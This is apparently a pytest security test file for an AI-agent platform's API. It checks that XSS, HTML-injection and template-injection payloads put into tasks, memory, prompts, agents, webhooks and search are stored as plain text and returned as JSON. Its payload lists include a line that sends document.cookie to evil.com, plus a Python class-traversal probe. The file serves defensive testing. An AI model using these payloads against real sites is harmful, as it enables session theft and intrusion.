"""
SEC-02: Cross-Site Scripting (XSS) & HTML Injection Tests
OWASP A03:2021 — Injection

Attack vectors:
  - Stored XSS via task titles, memory, agent names
  - Reflected XSS in search params
  - HTML injection in every text field
  - Script injection via JSON fields
  - Event handler injection
  - SVG-based XSS
  - Template literal injection
"""
import pytest
from tests.security.conftest import *

XSS_PAYLOADS = [
    '<script>alert("xss")</script>',
    '<script>alert(1)</script>',
    '"><script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror="fetch(\'http://evil.com/\'+document.cookie)">',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    'javascript:alert(1)',
    '<iframe src=javascript:alert(1)>',
    '"><img src=x onerror=alert(document.domain)>',
    '<input autofocus onfocus=alert(1)>',
    '\'" onmouseover=alert(1) x=\'',
    '<details open ontoggle=alert(1)>',
    '<video><source onerror=alert(1)>',
    '{{7*7}}',  # Template injection (SSTI)
    '${7*7}',   # Template injection
    '#{7*7}',   # Template injection
    '<a href="javascript:void(0)" onclick="alert(1)">click</a>',
]

HTML_INJECTION_PAYLOADS = [
    '<h1>Injected</h1>',
    '<b>Bold</b>',
    '<em>italic</em>',
    '<a href="http://evil.com">Click me</a>',
    '&lt;script&gt;alert(1)&lt;/script&gt;',  # HTML encoded — should be safe
]


class TestSecXSSInTaskFields:
    """Stored XSS via task management fields."""

    async def test_xss_in_task_title_stored_not_executed(self, C):
        """XSS payload stored as text, never executed server-side."""
        for payload in XSS_PAYLOADS[:6]:
            r = await POST(C, "/api/tasks", {
                "title": payload, "status": "todo", "priority": "medium"
            })
            sec_ok(r, f"XSS in task title: {payload[:40]}")
            d = r.json()
            
            # Must not reflect the payload in a way that would execute
            # The title should be stored as plain text
            assert r.status_code < 500, "Server crashed on XSS payload"
            
            tid = d.get("id")
            if tid:
                # Verify stored as-is (sanitization is frontend's job; backend stores)
                tasks = (await GET(C, "/api/tasks")).json()
                task = next((t for t in tasks if t.get("id") == tid), None)
                if task:
                    # Critical: the content-type must be JSON (application/json)
                    # not text/html, so script tags won't execute in API responses
                    ct = r.headers.get("content-type", "")
                    assert "text/html" not in ct, \
                        "XSS: API returning text/html allows script execution!"
                
                await DELETE(C, f"/api/tasks/{tid}")

    async def test_xss_in_task_description(self, C):
        """XSS in task description field."""
        for payload in XSS_PAYLOADS[:5]:
            r = await POST(C, "/api/tasks", {
                "title": uid("xss_test"),
                "description": payload,
                "status": "todo"
            })
            sec_ok(r, f"XSS in task description: {payload[:40]}")
            tid = r.json().get("id")
            if tid: await DELETE(C, f"/api/tasks/{tid}")

    async def test_all_xss_payloads_dont_crash_server(self, C):
        """All XSS payloads — none crash the API server."""
        for payload in XSS_PAYLOADS:
            r = await POST(C, "/api/tasks", {"title": payload[:240], "status": "todo"})
            assert r.status_code < 500, \
                f"XSS payload crashed server: {payload[:40]} → HTTP {r.status_code}"
            tid = r.json().get("id") if r.status_code == 200 else None
            if tid: await DELETE(C, f"/api/tasks/{tid}")

    async def test_content_type_always_json_on_api(self, C):
        """All API endpoints return application/json, never text/html."""
        endpoints = ["/api/agents", "/api/tasks", "/api/memory/list", 
                     "/api/profile", "/api/license/status"]
        for path in endpoints:
            r = await GET(C, path)
            ct = r.headers.get("content-type", "")
            assert "application/json" in ct, \
                f"SEC: {path} returned non-JSON content-type: {ct}"
            assert "text/html" not in ct, \
                f"SEC XSS: {path} returned text/html — script execution risk!"


class TestSecXSSInMemoryAndPrompts:
    """Stored XSS across memory and prompt fields."""

    async def test_xss_in_memory_content(self, C):
        """XSS in memory content stored as text, not rendered."""
        for payload in XSS_PAYLOADS[:5]:
            r = await POST(C, "/api/memory/add", {
                "content": payload, "source": "xss_test", "tags": "security,test"
            })
            sec_ok(r, f"XSS in memory: {payload[:40]}")
            d = r.json()
            assert d.get("ok") is True, f"Memory add failed: {payload[:40]}"
            mid = d.get("id")
            if mid: await DELETE(C, f"/api/memory/{mid}")

    async def test_xss_in_prompt_content(self, C):
        """XSS in prompt library content stored safely."""
        for payload in XSS_PAYLOADS[:5]:
            r = await POST(C, "/api/prompts", {
                "title": uid("xss_prompt"),
                "content": payload,
                "category": "general"
            })
            sec_ok(r, f"XSS in prompt: {payload[:40]}")
            pid = r.json().get("id")
            if pid: await DELETE(C, f"/api/prompts/{pid}")

    async def test_xss_in_agent_system_prompt(self, C):
        """XSS in agent system prompt — stored not executed by server."""
        for payload in XSS_PAYLOADS[:3]:
            r = await POST(C, "/api/agents", {
                "name": uid("xss_agent"),
                "model": "gemini-flash",
                "system_prompt": payload
            })
            sec_ok(r, f"XSS in agent system prompt: {payload[:40]}")
            d = r.json()
            aid = d.get("id") or (d.get("agent") or {}).get("id")
            if aid: await DELETE(C, f"/api/agents/{aid}")

    async def test_xss_in_steering_file_content(self, C):
        """XSS in steering file content."""
        for payload in XSS_PAYLOADS[:3]:
            r = await POST(C, "/api/steering", {
                "name": uid("xss_steer"),
                "content": payload,
                "enabled": False
            })
            sec_ok(r, f"XSS in steering: {payload[:40]}")
            d = r.json()
            sfid = d.get("id") or (d.get("file") or {}).get("id")
            if sfid: await DELETE(C, f"/api/steering/{sfid}")

    async def test_xss_in_webhook_fields(self, C):
        """XSS in webhook name and prompt template."""
        for payload in XSS_PAYLOADS[:3]:
            r = await POST(C, "/api/webhooks", {
                "name": payload[:80],
                "secret": "test",
                "prompt_template": payload
            })
            sec_ok(r, f"XSS in webhook: {payload[:40]}")
            d = r.json()
            whid = d.get("id") or (d.get("webhook") or {}).get("id")
            if whid: await DELETE(C, f"/api/webhooks/{whid}")


class TestSecTemplateInjection:
    """Server-Side Template Injection (SSTI) tests."""

    async def test_ssti_payloads_not_evaluated(self, C):
        """Template expressions must not be evaluated server-side."""
        ssti_payloads = [
            "{{7*7}}",           # Jinja2 / Flask
            "${7*7}",            # Java EL / Spring
            "#{7*7}",            # Spring EL
            "{{config}}",        # Flask/Jinja2 config dump
            "{{''.__class__.__mro__[1].__subclasses__()}}",  # Python class traversal
            "<%= 7*7 %>",        # ERB / Ruby
            "{#if 1==1}SSTI{/if}", # Handlebars-like
        ]
        
        for payload in ssti_payloads:
            # Store in task title
            r = await POST(C, "/api/tasks", {"title": payload})
            sec_ok(r, f"SSTI in task title: {payload[:40]}")
            d = r.json()
            tid = d.get("id")
            
            if tid:
                # Retrieve and verify NOT evaluated ({{7*7}} stays as {{7*7}}, not "49")
                tasks = (await GET(C, "/api/tasks")).json()
                task = next((t for t in tasks if t.get("id") == tid), None)
                if task:
                    stored_title = task.get("title", "")
                    if "7*7" in payload:
                        assert "49" not in stored_title or payload in stored_title, \
                            f"SSTI EVALUATED: '{{{{7*7}}}}' became '{stored_title}'"
                
                await DELETE(C, f"/api/tasks/{tid}")

    async def test_template_in_memory_not_evaluated(self, C):
        """Template expressions in memory are not evaluated."""
        r = await POST(C, "/api/memory/add", {
            "content": "{{7*7}} should be 49 if evaluated",
            "source": "ssti_test"
        })
        sec_ok(r, "SSTI in memory content")
        assert r.json().get("ok") is True

    async def test_template_in_docs_feedback(self, C):
        """Template injection in docs feedback doc_id."""
        for payload in ["{{7*7}}", "${7*7}", "#{config}"]:
            r = await POST(C, "/api/docs/feedback", {
                "doc_id": payload,
                "doc_type": "feature",
                "helpful": True
            })
            sec_ok(r, f"SSTI in feedback doc_id: {payload}")
            # Should succeed (stored as text) or fail (invalid doc_id)
            assert r.status_code < 500


class TestSecXSSViaSuggestions:
    """XSS payloads stored in history and returned via suggest."""

    async def test_xss_in_search_history(self, C):
        """XSS in search query — stored in history, must not execute via suggest."""
        xss_query = '<script>alert("xss")</script>'
        await DELETE(C, "/api/websearch/history")
        
        r = await POST(C, "/api/websearch/search", {
            "query": xss_query, "num_results": 1
        })
        sec_ok(r, "XSS in websearch query")
        
        # Check history contains it as text
        hist = (await GET(C, "/api/websearch/history")).json()
        items = hist.get("items", [])
        if items:
            stored = items[0]["query"]
            # Content is stored; just verify it's treated as data not code
            assert isinstance(stored, str), "History item query not a string"
        
        # Suggest endpoint returns JSON (not HTML) so XSS can't execute
        suggest = (await GET(C, "/api/websearch/suggest", q="<script")).json()
        ct = r.headers.get("content-type", "")
        # Suggest returns JSON — XSS can't fire in JSON context
        assert isinstance(suggest.get("suggestions", []), list)
        
        await DELETE(C, "/api/websearch/history")
